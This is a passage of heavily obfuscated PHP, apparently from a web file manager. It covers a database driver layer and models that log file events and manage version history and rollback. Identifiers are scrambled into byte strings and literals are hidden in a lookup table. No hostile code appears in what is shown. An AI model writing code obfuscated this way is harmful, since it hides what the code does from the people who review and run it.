$Øíøá”Á = $®ñ¡Üº[974] . $Å‹õå . $®ñ¡Üº[975]; break; case $®ñ¡Üº[948]: break; case $®ñ¡Üº[976]: default: $Øíøá”Á = $®ñ¡Üº[977] . ($this->dbType == $®ñ¡Üº[976] ? "\x60{$Å‹õå}\x60" : $Å‹õå); } } $ñËâß±× = $this->query($Øíøá”Á); $ÕØÉî = array(); if ($ñËâß±×) { foreach ($ñËâß±× as $Î„ÓßÈÅ => $ó»‘“è) { $ó»‘“è = array_change_key_case($ó»‘“è); $ó»‘“è[$®ñ¡Üº[32]] = isset($ó»‘“è[$®ñ¡Üº[32]]) ? $ó»‘“è[$®ñ¡Üº[32]] : $®ñ¡Üº[416]; $ó»‘“è[$®ñ¡Üº[33]] = isset($ó»‘“è[$®ñ¡Üº[33]]) ? $ó»‘“è[$®ñ¡Üº[33]] : $®ñ¡Üº[416]; $«Ë°¬Ÿ = isset($ó»‘“è[$®ñ¡Üº[311]]) ? $ó»‘“è[$®ñ¡Üº[311]] : $ó»‘“è[$®ñ¡Üº[32]]; $ÕØÉî[$«Ë°¬Ÿ] = array($®ñ¡Üº[32] => $«Ë°¬Ÿ, $®ñ¡Üº[33] => $ó»‘“è[$®ñ¡Üº[33]], $®ñ¡Üº[35] => (bool) (isset($ó»‘“è[$®ñ¡Üº[103]]) && $ó»‘“è[$®ñ¡Üº[103]] === $®ñ¡Üº[12] || isset($ó»‘“è[$®ñ¡Üº[35]]) && $ó»‘“è[$®ñ¡Üº[35]] === $®ñ¡Üº[12]), $®ñ¡Üº[37] => isset($ó»‘“è[$®ñ¡Üº[37]]) ? $ó»‘“è[$®ñ¡Üº[37]] : (isset($ó»‘“è[$®ñ¡Üº[56]]) ? $ó»‘“è[$®ñ¡Üº[56]] : $®ñ¡Üº[416]), $®ñ¡Üº[39] => isset($ó»‘“è[$®ñ¡Üº[94]]) ? strtolower($ó»‘“è[$®ñ¡Üº[94]]) == $®ñ¡Üº[41] : (isset($ó»‘“è[$®ñ¡Üº[57]]) ? $ó»‘“è[$®ñ¡Üº[57]] : !1), $®ñ¡Üº[42] => isset($ó»‘“è[$®ñ¡Üº[978]]) ? strtolower($ó»‘“è[$®ñ¡Üº[978]]) == $®ñ¡Üº[44] : (isset($ó»‘“è[$®ñ¡Üº[94]]) ? $ó»‘“è[$®ñ¡Üº[94]] : !1)); } } return $ÕØÉî; } public function getTables($Ñ„ñìé = '') { $€³ªÏùš =& $_SERVER[”ú…±Ú¥]; if (think_config($€³ªÏùš[979])) { $š”¤Şœ… = str_replace($€³ªÏùš[980], $Ñ„ñìé, think_config($€³ªÏùš[979])); } else { switch ($this->dbType) { case $€³ªÏùš[947]: case $€³ªÏùš[949]: $š”¤Şœ… = $€³ªÏùš[981]; break; case $€³ªÏùš[946]: case $€³ªÏùš[964]: $š”¤Şœ… = $€³ªÏùš[982]; break; case $€³ªÏùš[973]: $š”¤Şœ… = $€³ªÏùš[983]; break; case $€³ªÏùš[948]: think_exception(think_lang($€³ªÏùš[984]) . $€³ªÏùš[985]); break; case $€³ªÏùš[965]: $š”¤Şœ… = $€³ªÏùš[45] . $€³ªÏùš[46] . $€³ªÏùš[47]; break; case $€³ªÏùš[976]: default: if (!empty($Ñ„ñìé)) { $š”¤Şœ… = $€³ªÏùš[928] . $Ñ„ñìé . $€³ªÏùš[929]; } else { $š”¤Şœ… = $€³ªÏùš[930]; } } } $£åÖµ¶‘ = $this->query($š”¤Şœ…); $§äåú˜± = array(); foreach ($£åÖµ¶‘ as $å»Ñ€ø => $º‰ÖÇËƒ) { $§äåú˜±[$å»Ñ€ø] = current($º‰ÖÇËƒ); } return $§äåú˜±; } protected function parseLimit($¶ïæ÷Ú–) { $€¬ëé„± =& $_SERVER[”ú…±Ú¥]; $É ÙÂíå = $€¬ëé„±[12]; if (!empty($¶ïæ÷Ú–)) { switch ($this->dbType) { case $€¬ëé„±[973]: case $€¬ëé„±[965]: $¶ïæ÷Ú– = explode($€¬ëé„±[50], $¶ïæ÷Ú–); if (count($¶ïæ÷Ú–) > 1) { $É ÙÂíå .= $€¬ëé„±[51] . $¶ïæ÷Ú–[1] . $€¬ëé„±[52] . $¶ïæ÷Ú–[0] . $€¬ëé„±[53]; } else { $É ÙÂíå .= $€¬ëé„±[51] . $¶ïæ÷Ú–[0] . $€¬ëé„±[53]; } break; case $€¬ëé„±[946]: case $€¬ëé„±[964]: break; case $€¬ëé„±[948]: break; case $€¬ëé„±[947]: case $€¬ëé„±[949]: break; case $€¬ëé„±[976]: default: $É ÙÂíå .= $€¬ëé„±[51] . $¶ïæ÷Ú– . $€¬ëé„±[53]; } } return $É ÙÂíå; } public function parseKey(&$“çØçÑé, $Æ­›™¼ = true) { $›¸˜É =& $_SERVER[”ú…±Ú¥]; if ($Æ­›™¼) { $“çØçÑé = $this->parseKeyCheck($“çØçÑé); } if ($this->dbType == $›¸˜É[976]) { if ($“çØçÑé != $›¸˜É[199] && !preg_match($›¸˜É[940], $“çØçÑé)) { $“çØçÑé = $›¸˜É[423] . trim($“çØçÑé, $›¸˜É[423]) . $›¸˜É[423]; } return $“çØçÑé; } else { return parent::parseKey($“çØçÑé, $Æ­›™¼); } } public function close() { $this->_linkID = null; } public function error() { $ö¹©Ïˆ¿ =& $_SERVER[”ú…±Ú¥]; if ($this->PDOStatement) { $¬Å¿¨èÔ = $this->PDOStatement->errorInfo(); $this->error = $¬Å¿¨èÔ[1] . $ö¹©Ïˆ¿[4] . $¬Å¿¨èÔ[2]; } else { $this->error = $ö¹©Ïˆ¿[12]; } if ($ö¹©Ïˆ¿[12] != $this->queryStr) { $this->error .= LNG($ö¹©Ïˆ¿[48]) . $this->queryStr; } think_trace($this->error, $ö¹©Ïˆ¿[12], $ö¹©Ïˆ¿[49]); return $this->error; } public function escapeString($†ì÷¨Ö®) { $¦Ş¿ÆóÛ =& $_SERVER[”ú…±Ú¥]; switch ($this->dbType) { case $¦Ş¿ÆóÛ[973]: case $¦Ş¿ÆóÛ[946]: case $¦Ş¿ÆóÛ[964]: case $¦Ş¿ÆóÛ[976]: return addslashes($†ì÷¨Ö®); case $¦Ş¿ÆóÛ[948]: case $¦Ş¿ÆóÛ[965]: case $¦Ş¿ÆóÛ[947]: case $¦Ş¿ÆóÛ[949]: return str_ireplace($¦Ş¿ÆóÛ[58], $¦Ş¿ÆóÛ[59], $†ì÷¨Ö®); } } protected function parseValue($Ş¡ÌíïÀ) { $æàœÒªõ =& $_SERVER[”ú…±Ú¥]; if (is_string($Ş¡ÌíïÀ)) { $Ó»É•Ü = strpos($Ş¡ÌíïÀ, $æàœÒªõ[4]) === 0 && in_array($Ş¡ÌíïÀ, array_keys($this->bind)); $Ş¡ÌíïÀ = $Ó»É•Ü ? $this->escapeString($Ş¡ÌíïÀ) : $æàœÒªõ[986] . $this->escapeString($Ş¡ÌíïÀ) . $æàœÒªõ[986]; } elseif (isset($Ş¡ÌíïÀ[0]) && is_string($Ş¡ÌíïÀ[0]) && strtolower($Ş¡ÌíïÀ[0]) == $æàœÒªõ[335]) { $Ş¡ÌíïÀ = $this->escapeString($Ş¡ÌíïÀ[1]); } elseif (is_array($Ş¡ÌíïÀ)) { $Ş¡ÌíïÀ = array_map(array($this, $æàœÒªõ[987]), $Ş¡ÌíïÀ); } elseif (is_bool($Ş¡ÌíïÀ)) { $Ş¡ÌíïÀ = $Ş¡ÌíïÀ ? $æàœÒªõ[88] : $æàœÒªõ[208]; } elseif (is_null($Ş¡ÌíïÀ)) { $Ş¡ÌíïÀ = $æàœÒªõ[103]; } return $Ş¡ÌíïÀ; } public function getLastInsertId() { $Œ¨¢¨ãÙ =& $_SERVER[”ú…±Ú¥]; switch ($this->dbType) { case $Œ¨¢¨ãÙ[973]: case $Œ¨¢¨ãÙ[965]: case $Œ¨¢¨ãÙ[946]: case $Œ¨¢¨ãÙ[964]: case $Œ¨¢¨ãÙ[948]: case $Œ¨¢¨ãÙ[976]: return $this->_linkID->lastInsertId(); case $Œ¨¢¨ãÙ[947]: case $Œ¨¢¨ãÙ[949]: $— ‹Äõó = $this->table; $Ò·—ı¢Š = $this->query("\123\x45\x4c\105\x43\124\x20{$— ‹Äõó}\56\143\165\162\x72\x76\141\x6c\x20\x63\165\162\162\166\141\x6c\40\106\122\117\115\x20\144\x75\141\154"); return $Ò·—ı¢Š ? $Ò·—ı¢Š[0][$Œ¨¢¨ãÙ[988]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Ä÷¦²¯æ) { $ŸÌ’Á¿‰ =& $_SERVER[”ú…±Ú¥]; if (!CacheLock::fileLock($ŸÌ’Á¿‰[13])) { return !1; } $Õ‰áİ = parent::query($Ä÷¦²¯æ); CacheLock::fileUnLock($ŸÌ’Á¿‰[13]); return $Õ‰áİ; } public function execute($¾Ò†¿†²) { $»·Ÿ­šİ =& $_SERVER[”ú…±Ú¥]; if (!CacheLock::fileLock($»·Ÿ­šİ[13])) { return !1; } $ÓÌª•¥­ = parent::execute($¾Ò†¿†²); CacheLock::fileUnLock($»·Ÿ­šİ[13]); return $ÓÌª•¥­; } } goto Dß²…–ã¡; EÖ×ÊÅğŠ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\143\145\x5f\x65\166\x65\156\x74"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\x69\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\163\x65\x72\164", "\x66\165\x6e\143\164\151\157\x6e"), array("\x64\x65\x73\x63", '', "\x69\x6e\x73\145\x72\x74\54\165\x70\144\x61\x74\x65\x2c\163\x65\154\x65\x63\164", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($²×¡¼®“, $½€–÷µô, $ìºêúˆİ = '') { $†‚ï¥Å =& $_SERVER[”ú…±Ú¥]; if (!$this->eventSave) { return; } $—úøÓ÷” = Model($†‚ï¥Å[1362])->sourceInfo($²×¡¼®“); if (!$—úøÓ÷”) { return !1; } if ($this->isCacheEvent($—úøÓ÷”, $½€–÷µô)) { return; } if ($ìºêúˆİ && is_string($ìºêúˆİ)) { $ìºêúˆİ = array($†‚ï¥Å[1900] => $ìºêúˆİ); } $ÌÙ÷¤µ = defined($†‚ï¥Å[2082]) ? USER_ID : 0; $©÷‡‰øÛ = array($†‚ï¥Å[455] => $²×¡¼®“, $†‚ï¥Å[2083] => $—úøÓ÷”[$†‚ï¥Å[470]], $†‚ï¥Å[2084] => $—úøÓ÷”[$†‚ï¥Å[32]], $†‚ï¥Å[547] => !empty($—úøÓ÷”[$†‚ï¥Å[547]]) ? $—úøÓ÷”[$†‚ï¥Å[547]] : $†‚ï¥Å[12], $†‚ï¥Å[1662] => $ÌÙ÷¤µ, $†‚ï¥Å[460] => $½€–÷µô, $†‚ï¥Å[1664] => $ìºêúˆİ); $this->addSystemLog($½€–÷µô, $©÷‡‰øÛ); unset($©÷‡‰øÛ[$†‚ï¥Å[2084]], $©÷‡‰øÛ[$†‚ï¥Å[547]]); return $this->add($©÷‡‰øÛ); } private function addSystemLog($Ğ•Ğ×Ë, $®‚ßíÃ) { $—üı–½ =& $_SERVER[”ú…±Ú¥]; if ($Ğ•Ğ×Ë == $—üı–½[2085]) { $Ğ•Ğ×Ë = $®‚ßíÃ[$—üı–½[491]][$—üı–½[2086]]; } else { if (in_array($Ğ•Ğ×Ë, array($—üı–½[1841], $—üı–½[2087]))) { $Ğ•Ğ×Ë = $®‚ßíÃ[$—üı–½[491]][$—üı–½[786]]; } } $ğ†¥„¢á = array_merge($®‚ßíÃ, array($—üı–½[2088] => $®‚ßíÃ[$—üı–½[440]], $—üı–½[2089] => $®‚ßíÃ[$—üı–½[2089]])); Hook::trigger($—üı–½[2090], $—üı–½[2091] . $Ğ•Ğ×Ë, $®‚ßíÃ); Model($—üı–½[1805])->addLog($—üı–½[2091] . $Ğ•Ğ×Ë, $ğ†¥„¢á); } private function isCacheEvent($İìÄî¨˜, $œ¾àû§°) { if ($İìÄî¨˜[$_SERVER[”ú…±Ú¥][449]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($±‹€ÃÙù, $¦º©Èöø) { $åº’‚Ôˆ =& $_SERVER[”ú…±Ú¥]; $‚ÆÉ›¯Í = Model($åº’‚Ôˆ[1362])->sourceInfo($±‹€ÃÙù); $ªóß±ÇÊ = array($åº’‚Ôˆ[2086] => $¦º©Èöø, $åº’‚Ôˆ[32] => $‚ÆÉ›¯Í[$åº’‚Ôˆ[32]]); return $this->addEvent($±‹€ÃÙù, $åº’‚Ôˆ[2085], $ªóß±ÇÊ); } public function eventFileEdit($‰ÂÖ†ïù) { $²®€šŠİ =& $_SERVER[”ú…±Ú¥]; $¯ à¼Ç€ = array($²®€šŠİ[2092] => $_SERVER[$²®€šŠİ[2093]], $²®€šŠİ[2094] => strtolower(ACTION)); if (isset($GLOBALS[$²®€šŠİ[7]][$²®€šŠİ[2095]])) { $¯ à¼Ç€[$²®€šŠİ[2095]] = $²®€šŠİ[88]; } return $this->addEvent($‰ÂÖ†ïù, $²®€šŠİ[1831], $¯ à¼Ç€); } public function eventRecycle($æÌ¶ÊÉØ, $É­¼¢ìÇ) { return $this->addEvent($æÌ¶ÊÉØ, $_SERVER[”ú…±Ú¥][2087], $É­¼¢ìÇ); } public function eventRemove($éÎŞ¡»Ğ) { $•»˜Ãì“ =& $_SERVER[”ú…±Ú¥]; $—•ç¡– = Model($•»˜Ãì“[1362])->sourceInfo($éÎŞ¡»Ğ); $¸­ı±Ì‡ = $—•ç¡–[$•»˜Ãì“[32]]; return $this->addEvent($—•ç¡–[$•»˜Ãì“[470]], $•»˜Ãì“[1830], $¸­ı±Ì‡); } public function eventShare($ã†ˆ†ˆğ, $¢ØŒø—é) { return $this->addEvent($ã†ˆ†ˆğ, $_SERVER[”ú…±Ú¥][1841], $¢ØŒø—é); } public function eventMove($ğÍÊ„ö, $Ñ¢Ó¤©, $–é¨Ğ‡È) { $¨’‹®”´ =& $_SERVER[”ú…±Ú¥]; $Îø±¾•ü = Model($¨’‹®”´[1362]); $ÖİÊÆ¥ = $Îø±¾•ü->sourceInfo($ğÍÊ„ö); $ÇÓ°·§ˆ = $Îø±¾•ü->sourceInfo($Ñ¢Ó¤©); $²ğëÔ = $Îø±¾•ü->sourceInfo($–é¨Ğ‡È); $ˆøãëõë = array($¨’‹®”´[1189] => $Ñ¢Ó¤©, $¨’‹®”´[2096] => $ÇÓ°·§ˆ[$¨’‹®”´[32]], $¨’‹®”´[2073] => !empty($ÇÓ°·§ˆ[$¨’‹®”´[547]]) ? $ÇÓ°·§ˆ[$¨’‹®”´[547]] : $¨’‹®”´[12], $¨’‹®”´[1190] => $–é¨Ğ‡È, $¨’‹®”´[2097] => $²ğëÔ[$¨’‹®”´[32]], $¨’‹®”´[2098] => !empty($²ğëÔ[$¨’‹®”´[547]]) ? $²ğëÔ[$¨’‹®”´[547]] : $¨’‹®”´[12]); $this->addEvent($ğÍÊ„ö, $¨’‹®”´[586], $ˆøãëõë); $ÖİÊÆ¥ = $Îø±¾•ü->sourceInfo($ğÍÊ„ö); $ˆøãëõë = array($¨’‹®”´[440] => $ÖİÊÆ¥[$¨’‹®”´[440]], $¨’‹®”´[32] => $ÖİÊÆ¥[$¨’‹®”´[32]]); $this->addEvent($Ñ¢Ó¤©, $¨’‹®”´[2099], $ˆøãëõë); } public function eventCopy($ß·çÃŠŸ) { $this->eventCreate($ß·çÃŠŸ, $_SERVER[”ú…±Ú¥][584]); } public function eventRename($—àä¼éŠ, $ˆ²ı£µš, $ëñÜÍÚ) { $¥•šÁÙ =& $_SERVER[”ú…±Ú¥]; $ïõÁĞ¦ö = array($¥•šÁÙ[1189] => $ˆ²ı£µš, $¥•šÁÙ[1190] => $ëñÜÍÚ); return $this->addEvent($—àä¼éŠ, $¥•šÁÙ[1377], $ïõÁĞ¦ö); } public function eventAddComment($à¤ “¨É, $®’ÕŒáë) { return $this->addEvent($à¤ “¨É, $_SERVER[”ú…±Ú¥][2100], $®’ÕŒáë); } public function eventAddDesc($·š…­ù, $íƒ“Ã«ê) { return $this->addEvent($·š…­ù, $_SERVER[”ú…±Ú¥][2101], $íƒ“Ã«ê); } public function listBySource($´÷Å¯÷Â) { $Ô¾¹‹ =& $_SERVER[”ú…±Ú¥]; $ÆáÁÉÅ¸ = Model($Ô¾¹‹[1362])->sourceInfo($´÷Å¯÷Â); $áËış¾ = array($Ô¾¹‹[455] => $´÷Å¯÷Â); if ($ÆáÁÉÅ¸[$Ô¾¹‹[448]] == $Ô¾¹‹[88]) { $äÕâÅÈ· = Model($Ô¾¹‹[1362])->listSearchChildren($´÷Å¯÷Â, 20000); $äÕâÅÈ·[] = $´÷Å¯÷Â . $Ô¾¹‹[416]; $áËış¾ = array($Ô¾¹‹[440] => array($Ô¾¹‹[7], $äÕâÅÈ·)); } $»¨¦ÃÍÆ = $this->where($áËış¾)->order($Ô¾¹‹[2102])->selectPage(); if ($»¨¦ÃÍÆ[$Ô¾¹‹[404]][$Ô¾¹‹[405]] == 0) { $»¨¦ÃÍÆ[$Ô¾¹‹[404]][$Ô¾¹‹[405]] = 1; $»¨¦ÃÍÆ[$Ô¾¹‹[407]] = array(array($Ô¾¹‹[455] => $´÷Å¯÷Â, $Ô¾¹‹[2083] => $ÆáÁÉÅ¸[$Ô¾¹‹[470]], $Ô¾¹‹[1662] => $ÆáÁÉÅ¸[$Ô¾¹‹[492]], $Ô¾¹‹[460] => $Ô¾¹‹[2103], $Ô¾¹‹[461] => $ÆáÁÉÅ¸[$Ô¾¹‹[211]], $Ô¾¹‹[1664] => $Ô¾¹‹[12])); } return $this->eventListParse($»¨¦ÃÍÆ, $´÷Å¯÷Â); } private function eventListParse($­É‡ğÛ, $‘°È«»›) { $ş•ƒßà =& $_SERVER[”ú…±Ú¥]; $ú…íßòú = $­É‡ğÛ[$ş•ƒßà[407]]; $İ¬÷ìÎæ = array_to_keyvalue($ú…íßòú, $ş•ƒßà[12], $ş•ƒßà[440]); $—Û×âç = array_to_keyvalue($ú…íßòú, $ş•ƒßà[12], $ş•ƒßà[2089]); foreach ($ú…íßòú as $±šäÄÊÖ) { $èÏÅ–ä™ = $±šäÄÊÖ[$ş•ƒßà[491]]; if ($±šäÄÊÖ[$ş•ƒßà[33]] == $ş•ƒßà[586] && isset($èÏÅ–ä™[$ş•ƒßà[1189]])) { $İ¬÷ìÎæ[] = $èÏÅ–ä™[$ş•ƒßà[1189]] . $ş•ƒßà[12]; $İ¬÷ìÎæ[] = $èÏÅ–ä™[$ş•ƒßà[1190]] . $ş•ƒßà[12]; } if ($±šäÄÊÖ[$ş•ƒßà[33]] == $ş•ƒßà[2099] && isset($èÏÅ–ä™[$ş•ƒßà[440]])) { $İ¬÷ìÎæ[] = $èÏÅ–ä™[$ş•ƒßà[440]] . $ş•ƒßà[12]; } } $İ¬÷ìÎæ = array_merge($İ¬÷ìÎæ, $—Û×âç, array($‘°È«»› . $ş•ƒßà[12])); $İ¬÷ìÎæ = array_unique($İ¬÷ìÎæ); $—²ÓÑùå = array_unique(array_to_keyvalue($ú…íßòú, $ş•ƒßà[12], $ş•ƒßà[1671])); $¾‡¥ì¦ = Model($ş•ƒßà[563])->userListInfo($—²ÓÑùå); $ÙŞ‰‘à = Model($ş•ƒßà[857])->sourceListInfo($İ¬÷ìÎæ, !0); foreach ($ú…íßòú as &$±šäÄÊÖ) { if ($±šäÄÊÖ[$ş•ƒßà[33]] == $ş•ƒßà[586] && isset($±šäÄÊÖ[$ş•ƒßà[491]][$ş•ƒßà[1189]])) { $±šäÄÊÖ[$ş•ƒßà[491]][$ş•ƒßà[1189]] = $ÙŞ‰‘à[$±šäÄÊÖ[$ş•ƒßà[491]][$ş•ƒßà[1189]]]; $±šäÄÊÖ[$ş•ƒßà[491]][$ş•ƒßà[1190]] = $ÙŞ‰‘à[$±šäÄÊÖ[$ş•ƒßà[491]][$ş•ƒßà[1190]]]; } if ($±šäÄÊÖ[$ş•ƒßà[33]] == $ş•ƒßà[2099] && isset($±šäÄÊÖ[$ş•ƒßà[491]][$ş•ƒßà[440]])) { $±šäÄÊÖ[$ş•ƒßà[491]][$ş•ƒßà[440]] = $ÙŞ‰‘à[$±šäÄÊÖ[$ş•ƒßà[491]][$ş•ƒßà[440]]]; } $±šäÄÊÖ[$ş•ƒßà[87]] = $ÙŞ‰‘à[$±šäÄÊÖ[$ş•ƒßà[440]]]; $±šäÄÊÖ[$ş•ƒßà[2104]] = $ÙŞ‰‘à[$±šäÄÊÖ[$ş•ƒßà[2089]]]; if ($±šäÄÊÖ[$ş•ƒßà[33]] == $ş•ƒßà[1830]) { $±šäÄÊÖ[$ş•ƒßà[2104]] = $±šäÄÊÖ[$ş•ƒßà[87]]; $±šäÄÊÖ[$ş•ƒßà[2089]] = $±šäÄÊÖ[$ş•ƒßà[2104]][$ş•ƒßà[440]]; $±šäÄÊÖ[$ş•ƒßà[87]] = !1; $±šäÄÊÖ[$ş•ƒßà[440]] = $ş•ƒßà[12]; } $±šäÄÊÖ[$ş•ƒßà[2033]] = $¾‡¥ì¦[$±šäÄÊÖ[$ş•ƒßà[1671]]]; } unset($±šäÄÊÖ); $­É‡ğÛ[$ş•ƒßà[407]] = $ú…íßòú; return $­É‡ğÛ; } public function removeBySource($®¨õäµ…) { $à¬³ã©Ğ = array($_SERVER[”ú…±Ú¥][455] => $®¨õäµ…); $this->where($à¬³ã©Ğ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\143\x65\x5f\150\151\x73\x74\157\x72\x79"; public function historyCount($Š´è™¤Ô) { $¤ÁÅ£ø =& $_SERVER[”ú…±Ú¥]; if (!$Š´è™¤Ô) { return array(); } if (is_string($Š´è™¤Ô) || is_int($Š´è™¤Ô)) { $Š´è™¤Ô = array($Š´è™¤Ô); } $Ë»©Åòœ = array($¤ÁÅ£ø[440], $¤ÁÅ£ø[1894] => $¤ÁÅ£ø[529]); $‚ï•«¸ = array($¤ÁÅ£ø[440] => array($¤ÁÅ£ø[7], $Š´è™¤Ô)); $È·æîî¨ = $this->field($Ë»©Åòœ)->where($‚ï•«¸)->group($¤ÁÅ£ø[440])->select(); return array_to_keyvalue($È·æîî¨, $¤ÁÅ£ø[440], $¤ÁÅ£ø[529]); } public function addHistory($©şÖÌŞŒ, $›à€™º = '') { $¥ü¡»µ¨ =& $_SERVER[”ú…±Ú¥]; $é˜¹¯¸¥ = array($¥ü¡»µ¨[455] => $©şÖÌŞŒ[$¥ü¡»µ¨[440]], $¥ü¡»µ¨[1662] => isset($©şÖÌŞŒ[$¥ü¡»µ¨[494]]) ? $©şÖÌŞŒ[$¥ü¡»µ¨[494]] : $©şÖÌŞŒ[$¥ü¡»µ¨[492]], $¥ü¡»µ¨[507] => $©şÖÌŞŒ[$¥ü¡»µ¨[506]], $¥ü¡»µ¨[583] => $©şÖÌŞŒ[$¥ü¡»µ¨[76]], $¥ü¡»µ¨[2105] => $›à€™º); if ($GLOBALS[$¥ü¡»µ¨[6]][$¥ü¡»µ¨[89]][$¥ü¡»µ¨[1246]] >= 1) { $this->historyAutoClear($é˜¹¯¸¥[$¥ü¡»µ¨[440]]); $this->add($é˜¹¯¸¥); } Hook::trigger($¥ü¡»µ¨[2106], $é˜¹¯¸¥); Model($¥ü¡»µ¨[2107])->eventFileEdit($©şÖÌŞŒ[$¥ü¡»µ¨[440]]); } private function historyAutoClear($àëç„À) { $î°ë«Ø° =& $_SERVER[”ú…±Ú¥]; $˜ö¼²» = Model($î°ë«Ø°[802])->get($î°ë«Ø°[1268]); $È½Ñ˜Óğ = $GLOBALS[$î°ë«Ø°[6]][$î°ë«Ø°[89]][$î°ë«Ø°[1246]]; $ŞÂÖ ’Â = $˜ö¼²» == $î°ë«Ø°[1269] ? min(5, $È½Ñ˜Óğ) : $È½Ñ˜Óğ; $ŞÂÖ ’Â = $ŞÂÖ ’Â <= 0 ? 0 : $ŞÂÖ ’Â - 1; if ($ŞÂÖ ’Â >= 500) { return; } $Î«ëšíÇ = array($î°ë«Ø°[455] => $àëç„À); $—ÄÖŒàÁ = $this->field($î°ë«Ø°[2108])->where($Î«ëšíÇ)->order($î°ë«Ø°[2102])->select(); if (!$—ÄÖŒàÁ || $ŞÂÖ ’Â >= count($—ÄÖŒàÁ)) { return; } $ƒÂ¨™±“ = array_to_keyvalue($—ÄÖŒàÁ, $î°ë«Ø°[12], $î°ë«Ø°[437]); $ƒÂ¨™±“ = array_slice($ƒÂ¨™±“, $ŞÂÖ ’Â); $¶˜¨ş² = array_to_keyvalue($—ÄÖŒàÁ, $î°ë«Ø°[12], $î°ë«Ø°[506]); $¶˜¨ş² = array_slice($¶˜¨ş², $ŞÂÖ ’Â); if (!$ƒÂ¨™±“ || !$¶˜¨ş²) { return; } $Î«ëšíÇ = array($î°ë«Ø°[457] => array($î°ë«Ø°[7], $ƒÂ¨™±“)); $this->where($Î«ëšíÇ)->delete(); Model($î°ë«Ø°[509])->remove($¶˜¨ş²); } public function listData($±î³¤Âµ) { $÷ÔÌƒÜâ =& $_SERVER[”ú…±Ú¥]; $õŒşÉÉÕ = array($÷ÔÌƒÜâ[455] => $±î³¤Âµ); $ª·ŠßÓª = $÷ÔÌƒÜâ[2109]; $óëãğ‰š = $this->field($ª·ŠßÓª)->where($õŒşÉÉÕ)->order($÷ÔÌƒÜâ[2102])->selectPage(); $this->_listAppendUser($óëãğ‰š[$÷ÔÌƒÜâ[407]]); $Æ…¶íÈ£ = Model($÷ÔÌƒÜâ[802])->get($÷ÔÌƒÜâ[1268]); $ëµ”í¿ = 5; if ($Æ…¶íÈ£ == $÷ÔÌƒÜâ[1269]) { $óëãğ‰š[$÷ÔÌƒÜâ[407]] = array_slice($óëãğ‰š[$÷ÔÌƒÜâ[407]], 0, $ëµ”í¿); $óëãğ‰š[$÷ÔÌƒÜâ[404]] = array($÷ÔÌƒÜâ[2110] => 1, $÷ÔÌƒÜâ[2111] => 20, $÷ÔÌƒÜâ[2112] => 1, $÷ÔÌƒÜâ[2113] => count($óëãğ‰š[$÷ÔÌƒÜâ[407]])); } return $óëãğ‰š; } protected function _listAppendUser(&$“Ñ£éı¹) { $³Á×áÕ¿ =& $_SERVER[”ú…±Ú¥]; $®§Ø£å = array_to_keyvalue($“Ñ£éı¹, $³Á×áÕ¿[12], $³Á×áÕ¿[1671]); $Âî±º¶ı = Model($³Á×áÕ¿[563])->userListInfo($®§Ø£å); foreach ($“Ñ£éı¹ as &$¾—Ñ÷Æê) { $ô·óéÓ¦ = $¾—Ñ÷Æê[$³Á×áÕ¿[1671]]; $¾—Ñ÷Æê[$³Á×áÕ¿[492]] = $Âî±º¶ı[$ô·óéÓ¦] ? $Âî±º¶ı[$ô·óéÓ¦] : !1; } unset($¾—Ñ÷Æê); } public function fileInfo($×Ã¢¾›‡) { $Ó‹”£‚İ =& $_SERVER[”ú…±Ú¥]; $á´Ğ²ç· = $this->tablePrefix; $û´Á®µÃ = "{$á´Ğ²ç·}\x69\x6f\137\146\151\154\145\x20\146\x69\x6c\x65\x73\40\x6f\x6e\40\146\x69\154\145\163\x2e\x66\x69\x6c\x65\x49\104\x20\75\x20\x68\151\163\x74\x6f\162\171\x2e\x66\x69\x6c\145\x49\104"; return $this->alias($Ó‹”£‚İ[2114])->where(array($Ó‹”£‚İ[457] => $×Ã¢¾›‡))->join($û´Á®µÃ, $Ó‹”£‚İ[2115])->find(); } public function removeItem($æ›Ğ±¹Ê) { $”ÖŸÅÛç =& $_SERVER[”ú…±Ú¥]; $ßŠ´°¢Ñ = array($”ÖŸÅÛç[457] => $æ›Ğ±¹Ê); $ÚÛĞŸ›š = $this->where($ßŠ´°¢Ñ)->find(); if ($ÚÛĞŸ›š) { $†ÒÈÅÁ´ = $this->where($ßŠ´°¢Ñ)->delete(); Model($”ÖŸÅÛç[509])->remove($ÚÛĞŸ›š[$”ÖŸÅÛç[506]]); return $†ÒÈÅÁ´; } return !1; } public function removeBySource($µğø­Ê) { $§³Ôİ÷¡ =& $_SERVER[”ú…±Ú¥]; if (!$µğø­Ê) { return !1; } if (!is_array($µğø­Ê)) { $µğø­Ê = array($µğø­Ê); } $é»°ÄÑ = array($§³Ôİ÷¡[455] => array($§³Ôİ÷¡[7], $µğø­Ê)); $“¯’£Ô = $this->field($§³Ôİ÷¡[507])->where($é»°ÄÑ)->select(); if ($“¯’£Ô) { $this->where($é»°ÄÑ)->delete(); $ë³·Ô–ó = array_to_keyvalue($“¯’£Ô, $§³Ôİ÷¡[12], $§³Ôİ÷¡[506]); Model($§³Ôİ÷¡[509])->remove($ë³·Ô–ó); } return !0; } public function setDetail($Ã°¨’Ä, $ÎŒş¬“º) { $¨´”Ç§® =& $_SERVER[”ú…±Ú¥]; return $this->where(array($¨´”Ç§®[457] => $Ã°¨’Ä))->save(array($¨´”Ç§®[2105] => $ÎŒş¬“º)); } public function rollbackToItem($ê¤ªÎ”, $Õ„ŠØı¥) { $ËœèéüÇ =& $_SERVER[”ú…±Ú¥]; $‚¶¤ÁÑÔ = Model($ËœèéüÇ[857])->sourceInfo($ê¤ªÎ”); $this->addHistory($‚¶¤ÁÑÔ, LNG($ËœèéüÇ[2116])); $¦Í‹â‰á = $this->find($Õ„ŠØı¥); $ÚèáÏ¹ê = array($ËœèéüÇ[506] => $¦Í‹â‰á[$ËœèéüÇ[506]], $ËœèéüÇ[76] => $¦Í‹â‰á[$ËœèéüÇ[76]], $ËœèéüÇ[85] => time(), $ËœèéüÇ[494] => USER_ID); Model($ËœèéüÇ[857])->where(array($ËœèéüÇ[440] => 